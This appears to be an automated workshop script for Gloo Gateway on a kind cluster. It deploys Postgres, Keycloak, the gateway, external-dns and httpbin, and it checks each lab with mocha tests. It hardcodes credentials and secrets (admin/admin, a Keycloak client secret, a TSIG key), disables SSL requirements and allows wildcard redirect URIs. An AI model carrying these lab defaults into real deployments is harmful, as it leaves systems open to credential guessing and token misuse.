#!/usr/bin/env bash
source /root/.env 2>/dev/null || true
source ./scripts/assert.sh
export CLUSTER1=cluster1
bash ./data/steps/deploy-kind-clusters/deploy-cluster1.sh
./scripts/check.sh cluster1
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Clusters are healthy", () => {
    const clusters = ["cluster1"];

    clusters.forEach(cluster => {
        it(`Cluster ${cluster} is healthy`, () => helpers.k8sObjectIsPresent({ context: cluster, namespace: "default", k8sType: "service", k8sObj: "kubernetes" }));
    });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-kind-clusters/tests/cluster-healthy.test.js.liquid from lab number 1"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 1"; exit 1; }
kubectl --context ${CLUSTER1} create namespace gloo-system
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: postgres
  namespace: gloo-system
---
apiVersion: v1
kind: Secret
metadata:
  name: postgres-secrets
  namespace: gloo-system
type: Opaque
data:
  POSTGRES_DB: ZGI=
  POSTGRES_USER: YWRtaW4=
  POSTGRES_PASSWORD: YWRtaW4=
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: postgres-pvc
  namespace: gloo-system
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 5Gi
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: postgres
  namespace: gloo-system
spec:
  replicas: 1
  selector:
    matchLabels:
      app: postgres
  template:
    metadata:
      labels:
        app: postgres
    spec:
      serviceAccountName: postgres
      volumes:
        - name: postgres-storage
          persistentVolumeClaim:
            claimName: postgres-pvc
      containers:
        - name: postgres
          image: postgres:13.2-alpine
          imagePullPolicy: 'IfNotPresent'
          ports:
            - containerPort: 5432
          envFrom:
            - secretRef:
                name: postgres-secrets
          volumeMounts:
            - name: postgres-storage
              mountPath: /var/lib/postgresql/data
              subPath: postgres
---
apiVersion: v1
kind: Service
metadata:
  name: postgres
  namespace: gloo-system
spec:
  selector:
    app: postgres
  ports:
    - port: 5432
EOF
kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy/postgres

sleep 5
kubectl --context ${CLUSTER1} -n gloo-system exec deploy/postgres -- psql -U admin -d db -c "CREATE DATABASE keycloak;"
kubectl --context ${CLUSTER1} -n gloo-system exec deploy/postgres -- psql -U admin -d db -c "CREATE USER keycloak WITH PASSWORD 'password';"
kubectl --context ${CLUSTER1} -n gloo-system exec deploy/postgres -- psql -U admin -d db -c "GRANT ALL PRIVILEGES ON DATABASE keycloak TO keycloak;"
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Postgres", () => {
  it('postgres pods are ready in cluster1', () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "gloo-system", k8sObj: "postgres" }));
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-keycloak/tests/postgres-available.test.js.liquid from lab number 2"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
KEYCLOAK_CLIENT=gloo-ext-auth
KEYCLOAK_SECRET=hKcDcqmUKCrPkyDJtCw066hTLzUbAiri
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: oauth
  namespace: gloo-system
type: extauth.solo.io/oauth
stringData:
  client-id: ${KEYCLOAK_CLIENT}
  client-secret: ${KEYCLOAK_SECRET}
EOF
kubectl --context ${CLUSTER1} create namespace keycloak

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
data:
  workshop-realm.json: |-
    {
      "realm": "workshop",
      "enabled": true,
      "displayName": "solo.io",
      "accessTokenLifespan": 1800,
      "sslRequired": "none",
      "users": [
        {
          "username": "user1",
          "enabled": true,
          "email": "user1@example.com",
          "attributes": {
            "group": [
              "users"
            ],
            "subscription": [
              "enterprise"
            ]
          },
          "credentials": [
            {
              "type": "password",
              "secretData": "{\"value\":\"JsfNbCOIdZUbyBJ+BT+VoGI91Ec2rWLOvkLPDaX8e9k=\",\"salt\":\"P5rtFkGtPfoaryJ6PizUJw==\",\"additionalParameters\":{}}",
              "credentialData": "{\"hashIterations\":27500,\"algorithm\":\"pbkdf2-sha256\",\"additionalParameters\":{}}"
            }
          ]
        },
        {
          "username": "user2",
          "enabled": true,
          "email": "user2@solo.io",
          "attributes": {
            "group": [
              "users"
            ],
            "subscription": [
              "free"
            ],
            "show_personal_data": [
              "false"
            ]
          },
          "credentials": [
            {
              "type": "password",
              "secretData": "{\"value\":\"RITBVPdh5pvXOa4JzJ5pZTE0rG96zhnQNmSsKCf83aU=\",\"salt\":\"drB9e5Smf3cbfUfF3FUerw==\",\"additionalParameters\":{}}",
              "credentialData": "{\"hashIterations\":27500,\"algorithm\":\"pbkdf2-sha256\",\"additionalParameters\":{}}"
            }
          ]
        },
        {
          "username": "admin1",
          "enabled": true,
          "email": "admin1@solo.io",
          "attributes": {
            "group": [
              "admin"
            ],
            "show_personal_data": [
              "false"
            ]
          },
          "credentials": [
            {
              "type": "password",
              "secretData" : "{\"value\":\"BruFLfFkjH/8erZ26NnrbkOrWiZuQyDRCHD9o0R6Scg=\",\"salt\":\"Cf9AYCE5pAbb4CKEF0GUTA==\",\"additionalParameters\":{}}",
              "credentialData" : "{\"hashIterations\":5,\"algorithm\":\"argon2\",\"additionalParameters\":{\"hashLength\":[\"32\"],\"memory\":[\"7168\"],\"type\":[\"id\"],\"version\":[\"1.3\"],\"parallelism\":[\"1\"]}}"
            }
          ]
        }
      ],
      "clients": [
        {
          "clientId": "${KEYCLOAK_CLIENT}",
          "secret": "${KEYCLOAK_SECRET}",
          "redirectUris": [
            "*"
          ],
          "webOrigins": [
            "+"
          ],
          "authorizationServicesEnabled": true,
          "directAccessGrantsEnabled": true,
          "serviceAccountsEnabled": true,
          "protocolMappers": [
            {
              "name": "group",
              "protocol": "openid-connect",
              "protocolMapper": "oidc-usermodel-attribute-mapper",
              "config": {
                "claim.name": "group",
                "user.attribute": "group",
                "access.token.claim": "true",
                "id.token.claim": "true"
              }
            },
            {
              "name": "show_personal_data",
              "protocol": "openid-connect",
              "protocolMapper": "oidc-usermodel-attribute-mapper",
              "config": {
                "claim.name": "show_personal_data",
                "user.attribute": "show_personal_data",
                "access.token.claim": "true",
                "id.token.claim": "true"
              }
            },
            {
              "name": "subscription",
              "protocol": "openid-connect",
              "protocolMapper": "oidc-usermodel-attribute-mapper",
              "config": {
                "claim.name": "subscription",
                "user.attribute": "subscription",
                "access.token.claim": "true",
                "id.token.claim": "true"
              }
            },
            {
              "name": "name",
              "protocol": "openid-connect",
              "protocolMapper": "oidc-usermodel-property-mapper",
              "config": {
                "claim.name": "name",
                "user.attribute": "username",
                "access.token.claim": "true",
                "id.token.claim": "true"
              }
            }
          ]
        }
      ],
      "components": {
        "org.keycloak.userprofile.UserProfileProvider": [
          {
            "providerId": "declarative-user-profile",
            "config": {
              "kc.user.profile.config": [
                "{\"attributes\":[{\"name\":\"username\"},{\"name\":\"email\"}],\"unmanagedAttributePolicy\":\"ENABLED\"}"
              ]
            }
          }
        ]
      }
    }
  portal-realm.json: |
    {
      "realm": "portal-mgmt",
      "enabled": true,
      "sslRequired": "none",
      "roles": {
        "client": {
          "gloo-portal-idp": [
            {
              "name": "uma_protection",
              "composite": false,
              "clientRole": true,
              "attributes": {}
            }
          ]
        },
        "realm": [
          {
            "name": "default-roles-portal-mgmt",
            "description": "${role_default-roles}",
            "composite": true,
            "composites": {
              "realm": [
                "offline_access",
                "uma_authorization"
              ],
              "client": {
                "account": [
                  "manage-account",
                  "view-profile"
                ]
              }
            },
            "clientRole": false,
            "attributes": {}
          },
          {
            "name": "uma_authorization",
            "description": "${role_uma_authorization}",
            "composite": false,
            "clientRole": false
          }
        ]
      },
      "users": [
        {
          "username": "service-account-gloo-portal-idp",
          "createdTimestamp": 1727724261768,
          "emailVerified": false,
          "enabled": true,
          "totp": false,
          "serviceAccountClientId": "gloo-portal-idp",
          "disableableCredentialTypes": [],
          "requiredActions": [],
          "realmRoles": [
            "default-roles-portal-mgmt"
          ],
          "clientRoles": {
            "realm-management": [
              "manage-clients"
            ],
            "gloo-portal-idp": [
              "uma_protection"
            ]
          },
          "notBefore": 0,
          "groups": []
        }
      ],
      "clients": [
        {
          "clientId": "gloo-portal-idp",
          "enabled": true,
          "name": "Solo.io Gloo Portal Resource Server",
          "clientAuthenticatorType": "client-secret",
          "secret": "gloo-portal-idp-secret",
          "serviceAccountsEnabled": true,
          "authorizationServicesEnabled": true,
          "authorizationSettings": {
            "allowRemoteResourceManagement": true,
            "policyEnforcementMode": "ENFORCING",
            "resources": [
              {
                "name": "Default Resource",
                "type": "urn:gloo-portal-idp:resources:default",
                "ownerManagedAccess": false,
                "attributes": {},
                "uris": [
                  "/*"
                ]
              }
            ],
            "policies": [
              {
                "name": "Default Policy",
                "description": "A policy that grants access only for users within this realm",
                "type": "regex",
                "logic": "POSITIVE",
                "decisionStrategy": "AFFIRMATIVE",
                "config": {
                  "targetContextAttributes" : "false",
                  "pattern" : ".*",
                  "targetClaim" : "sub"
                }
              },
              {
                "name": "Default Permission",
                "description": "A permission that applies to the default resource type",
                "type": "resource",
                "logic": "POSITIVE",
                "decisionStrategy": "UNANIMOUS",
                "config": {
                  "defaultResourceType": "urn:gloo-portal-idp:resources:default",
                  "applyPolicies": "[\"Default Policy\"]"
                }
              }
            ],
            "scopes": [],
            "decisionStrategy": "UNANIMOUS"
          }
        }
      ]
    }
kind: ConfigMap
metadata:
  name: realms
  namespace: keycloak
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Service
metadata:
  name: keycloak
  namespace: keycloak
  labels:
    app: keycloak
spec:
  ports:
  - name: http
    port: 8080
    targetPort: 8080
  selector:
    app: keycloak
  type: LoadBalancer
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: keycloak
  namespace: keycloak
  labels:
    app: keycloak
spec:
  replicas: 1
  selector:
    matchLabels:
      app: keycloak
  template:
    metadata:
      labels:
        app: keycloak
    spec:
      containers:
      - name: keycloak
        image: quay.io/keycloak/keycloak:25.0.5
        args:
        - start-dev
        - --import-realm
        - --proxy-headers=xforwarded
        - --features=hostname:v1
        - --hostname-strict=false
        - --hostname-strict-https=false
        env:
        - name: KEYCLOAK_ADMIN
          value: admin
        - name: KEYCLOAK_ADMIN_PASSWORD
          value: admin
        - name: KC_DB
          value: postgres
        - name: KC_DB_URL
          value: jdbc:postgresql://postgres.gloo-system.svc.cluster.local:5432/keycloak
        - name: KC_DB_USERNAME
          value: keycloak
        - name: KC_DB_PASSWORD
          value: password
        ports:
        - name: http
          containerPort: 8080
        readinessProbe:
          httpGet:
            path: /realms/workshop
            port: 8080
        volumeMounts:
        - name: realms
          mountPath: /opt/keycloak/data/import
      volumes:
      - name: realms
        configMap:
          name: realms
EOF
kubectl --context ${CLUSTER1} -n keycloak rollout status deploy/keycloak
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Keycloak", () => {
  it('keycloak pods are ready in cluster1', () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "keycloak", k8sObj: "keycloak" }));
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-keycloak/tests/pods-available.test.js.liquid from lab number 2"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("Retrieve enterprise-networking ip", () => {
  it("A value for load-balancing has been assigned", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n keycloak get svc keycloak -o jsonpath='{.status.loadBalancer}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.contain('"ingress"');
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-keycloak/tests/keycloak-ip-is-attached.test.js.liquid from lab number 2"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
timeout 2m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n keycloak get svc keycloak -o json | jq '.status.loadBalancer | length') -gt 0 ]]; do
  sleep 1
done"
export ENDPOINT_KEYCLOAK=$(kubectl --context ${CLUSTER1} -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}'):8080
export HOST_KEYCLOAK=$(echo ${ENDPOINT_KEYCLOAK%:*})
export PORT_KEYCLOAK=$(echo ${ENDPOINT_KEYCLOAK##*:})
export KEYCLOAK_URL=http://${ENDPOINT_KEYCLOAK}
cat <<'EOF' > ./test.js
const dns = require('dns');
const chaiHttp = require("chai-http");
const chai = require("chai");
const expect = chai.expect;
chai.use(chaiHttp);
const { waitOnFailedTest } = require('./tests/utils');

afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});

describe("Address '" + process.env.HOST_KEYCLOAK + "' can be resolved in DNS", () => {
    it(process.env.HOST_KEYCLOAK + ' can be resolved', (done) => {
        return dns.lookup(process.env.HOST_KEYCLOAK, (err, address, family) => {
            expect(address).to.be.an.ip;
            done();
        });
    });
});
EOF
echo "executing test ./default/tests/can-resolve.test.js.liquid from lab number 2"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
echo "Waiting for Keycloak to be ready at $KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token"
timeout 300 bash -c 'while [[ "$(curl -m 2 -s -o /dev/null -w ''%{http_code}'' $KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token)" != "405" ]]; do printf '.';sleep 1; done' || false
kubectl --context $CLUSTER1 apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.3.0/experimental-install.yaml
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: portal-database-config
  namespace: gloo-system
type: Opaque
data:
  config.yaml: |
    ZHNuOiBob3N0PXBvc3RncmVzLmdsb28tc3lzdGVtLnN2Yy5jbHVzdGVyLmxvY2FsIHBvcnQ9NTQzMiB1c2VyPWFkbWluIHBhc3N3b3JkPWFkbWluIGRibmFtZT1kYiBzc2xtb2RlPWRpc2FibGUK
EOF
helm repo add gloo-ee-helm https://storage.googleapis.com/gloo-ee-helm
helm repo update
helm upgrade -i -n gloo-system \
  gloo-gateway gloo-ee-helm/gloo-ee \
  --create-namespace \
  --version 1.19.1 \
  --kube-context $CLUSTER1 \
  --set-string license_key=$LICENSE_KEY \
  -f -<<EOF
gloo:
  kubeGateway:
    enabled: true
    gatewayParameters:
      glooGateway:
        podTemplate:
          gracefulShutdown:
            enabled: true
          livenessProbeEnabled: true
          probes: true
    portal:
      enabled: true
  gatewayProxies:
    gatewayProxy:
      disabled: true
  gateway:
    validation:
      allowWarnings: true
      alwaysAcceptResources: false
      livenessProbeEnabled: true
  gloo:
    logLevel: info
    deployment:
      livenessProbeEnabled: true
  discovery:
    enabled: false
observability:
  enabled: false
prometheus:
  enabled: false
grafana:
  defaultInstallationEnabled: false
gloo-fed:
  enabled: false
  glooFedApiserver:
    enable: false
gateway-portal-web-server:
  enabled: true
  glooPortalServer:
    database:
      type: postgres
global:
  extensions:
    caching:
      enabled: true
EOF
kubectl --context $CLUSTER1 patch settings default -n gloo-system --type json \
  -p '[{ "op": "remove", "path": "/spec/cachingServer" }]'
echo -n Waiting for Gloo Gateway pods to be ready...
kubectl --context $CLUSTER1 -n gloo-system rollout status deployment
kubectl --context $CLUSTER1 -n gloo-system get pods
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Gloo Gateway", () => {
  let cluster = process.env.CLUSTER1;
  let deployments = ["gloo", "extauth", "rate-limit", "redis"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "gloo-system", k8sObj: deploy }));
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-gloo-gateway-enterprise/tests/check-gloo.test.js.liquid from lab number 3"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 3"; exit 1; }
docker run -u $(id -u):$(id -g) -d --name isc-bind --network kind -v ${PWD}/data/steps/deploy-external-dns:/etc/bind --entrypoint /usr/sbin/named ubuntu/bind9 -g || true
export BIND_CONTAINER_IP=$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' isc-bind)
helm repo add external-dns https://kubernetes-sigs.github.io/external-dns/
helm repo update
helm upgrade --install external-dns external-dns/external-dns \
  --namespace external-dns --create-namespace \
  --version 1.16.1 \
  --kube-context cluster1 \
  -f -<< EOF
registry: txt
provider: rfc2136
txtPrefix: external-dns-
txtOwnerId: gloo
interval: 15s
logLevel: debug
logFormat: text
podLabels:
  app: external-dns
serviceAccount:
  create: true
rbac:
  create: true
  additionalPermissions:
    - apiGroups: [""]
      resources: ["namespaces"]
      verbs: ["get","watch","list"]
    - apiGroups: ["gateway.networking.k8s.io"]
      resources: ["gateways","httproutes","grpcroutes","tlsroutes","tcproutes","udproutes"]
      verbs: ["get","watch","list"]
sources:
  - gateway-httproute
domainFilters:
  - example.com
extraArgs:
  - --rfc2136-host=${BIND_CONTAINER_IP}
  - --rfc2136-port=53
  - --rfc2136-zone=example.com
  - --rfc2136-tsig-secret=RxV0FGl4sOYHm3fBbzL4pd5QOnz/8TR1B+HS7mGf3a4=
  - --rfc2136-tsig-secret-alg=hmac-sha256
  - --rfc2136-tsig-keyname=externaldns
  - --rfc2136-min-ttl=60s
  - --rfc2136-tsig-axfr
EOF
kubectl --context ${CLUSTER1} create ns httpbin
kubectl --context ${CLUSTER1} apply -f data/steps/deploy-httpbin/app-httpbin1.yaml
kubectl --context ${CLUSTER1} apply -f data/steps/deploy-httpbin/app-httpbin2.yaml
echo -n Waiting for httpbin pods to be ready...
kubectl --context ${CLUSTER1} -n httpbin rollout status deployment
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("httpbin app", () => {
  let cluster = process.env.CLUSTER1
  let deployments = ["httpbin1", "httpbin2"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "httpbin", k8sObj: deploy }));
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/deploy-httpbin/tests/check-httpbin.test.js.liquid from lab number 5"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 5"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
kind: Gateway
apiVersion: gateway.networking.k8s.io/v1
metadata:
  name: http
  namespace: gloo-system
spec:
  gatewayClassName: gloo-gateway
  listeners:
  - protocol: HTTP
    port: 80
    name: http
    allowedRoutes:
      namespaces:
        from: All
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: http
  hostnames:
    - "httpbin.example.com"
  rules:
    - backendRefs:
        - name: httpbin1
          port: 8000
EOF
export PROXY_IP=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
RETRY_COUNT=0
MAX_RETRIES=60
while true; do
  GLOO_PROXY_SVC=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -oname 2>/dev/null || echo "")
  if [[ -n "$GLOO_PROXY_SVC" ]]; then
    echo "Service gloo-proxy-http has been created."
    break
  fi

  RETRY_COUNT=$((RETRY_COUNT + 1))
  if [[ $RETRY_COUNT -ge $MAX_RETRIES ]]; then
    echo "Warning: Maximum retries reached. Service gloo-proxy-http could not be found."
    break
  fi

  echo "Waiting for service gloo-proxy-http to be created... Attempt $RETRY_COUNT/$MAX_RETRIES"
  sleep 1
done

# Then, wait for the IP to be assigned
RETRY_COUNT=0
MAX_RETRIES=60
while [[ -z "$PROXY_IP" && $RETRY_COUNT -lt $MAX_RETRIES && -n "$GLOO_PROXY_SVC" ]]; do
  echo "Waiting for PROXY_IP to be assigned... Attempt $((RETRY_COUNT + 1))/$MAX_RETRIES"
  PROXY_IP=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
  RETRY_COUNT=$((RETRY_COUNT + 1))
  sleep 5
done

# if PROXY_IP is a hostname, resolve it to an IP address
if [[ -n "$PROXY_IP" && $PROXY_IP =~ [a-zA-Z] ]]; then
  while [[ -z "$IP" && $RETRY_COUNT -lt $MAX_RETRIES ]]; do
    echo "Waiting for PROXY_IP to be propagated in DNS... Attempt $((RETRY_COUNT + 1))/$MAX_RETRIES"
    IP=$(dig +short A "$PROXY_IP" | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ {print; exit}')
    RETRY_COUNT=$((RETRY_COUNT + 1))
    sleep 5
  done
else
  IP="$PROXY_IP"
fi

if [[ -z "$PROXY_IP" ]]; then
  echo "WARNING: Maximum number of retries reached. PROXY_IP could not be assigned."
else
  export PROXY_IP
  export IP
  echo "PROXY_IP has been assigned: $PROXY_IP"
  echo "IP has been resolved to: $IP"
fi
./scripts/register-domain.sh httpbin.example.com ${IP}
cat <<'EOF' > ./test.js
const dns = require('dns');
const chaiHttp = require("chai-http");
const chai = require("chai");
const expect = chai.expect;
chai.use(chaiHttp);
const { waitOnFailedTest } = require('./tests/utils');

afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});

describe("ExternalDNS dns entry validation", () => {
    it('httpbin.example.com resolves to ' + process.env.IP + ' by the local test DNS server ' + process.env.BIND_CONTAINER_IP, (done) => {
        dns.setServers([ process.env.BIND_CONTAINER_IP ]);
        return dns.resolve('httpbin.example.com', (error, address) => {
            if (!error) {
                expect(address.toString()).to.be.eq(process.env.IP);
            }
            done(error);
        });
    });
});

EOF
echo "executing test ./default/tests/external-dns.test.js.liquid from lab number 6"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=50 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 6"; exit 1; }
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTP", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `http://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/expose-httpbin/tests/http.test.js.liquid from lab number 6"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 6"; exit 1; }
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
   -keyout tls.key -out tls.crt -subj "/CN=*"
kubectl create --context ${CLUSTER1} -n gloo-system secret tls tls-secret --key tls.key \
   --cert tls.crt
kubectl apply --context ${CLUSTER1} -f - <<EOF
kind: Gateway
apiVersion: gateway.networking.k8s.io/v1
metadata:
  name: http
  namespace: gloo-system
spec:
  gatewayClassName: gloo-gateway
  listeners:
  - protocol: HTTPS
    port: 443
    name: https-httpbin
    hostname: httpbin.example.com
    tls:
      mode: Terminate
      certificateRefs:
        - name: tls-secret
          kind: Secret
    allowedRoutes:
      namespaces:
        from: All
  - protocol: HTTPS
    port: 443
    name: https
    tls:
      mode: Terminate
      certificateRefs:
        - name: tls-secret
          kind: Secret
    allowedRoutes:
      namespaces:
        from: All
  - protocol: HTTP
    port: 80
    name: http
    allowedRoutes:
      namespaces:
        from: All
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - backendRefs:
        - name: httpbin1
          port: 8000
EOF
kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy gloo-proxy-http
echo -n Wait for up to 2 minutes until the url is ready...
RETRY_COUNT=0
MAX_RETRIES=30
while [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; do
  echo "Attempt $((RETRY_COUNT + 1))/$MAX_RETRIES"
  ret=`curl -k -s -o /dev/null -w %{http_code} https://httpbin.example.com/get`
  if [ "$ret" -eq "200" ]; then
    break
  else
    echo "Response was: $ret"
    echo "Retrying in 4 seconds..."
  fi
  RETRY_COUNT=$((RETRY_COUNT + 1))
  sleep 4
done
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/expose-httpbin/tests/https.test.js.liquid from lab number 6"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 6"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: redirect-http-to-https
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: http
  hostnames:
    - "httpbin.example.com"
  rules:
    - filters:
      - type: RequestRedirect
        requestRedirect:
          scheme: https
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("location header correctly set", () => {
  it('Checking text \'location\'', () => helpersHttp.checkHeaders({ host: `http://httpbin.example.com`, path: '/get', expectedHeaders: [{'key': 'location', 'value': `https://httpbin.example.com/get`}]}));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/expose-httpbin/tests/redirect-http-to-https.test.js.liquid from lab number 6"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 6"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: '*'
          namespace: httpbin
          group: gateway.networking.k8s.io
          kind: HTTPRoute
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/https.test.js.liquid from lab number 7"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /status
      backendRefs:
        - name: '*'
          namespace: httpbin
          group: gateway.networking.k8s.io
          kind: HTTPRoute
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: Exact
          value: /status/200
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid from lab number 7"
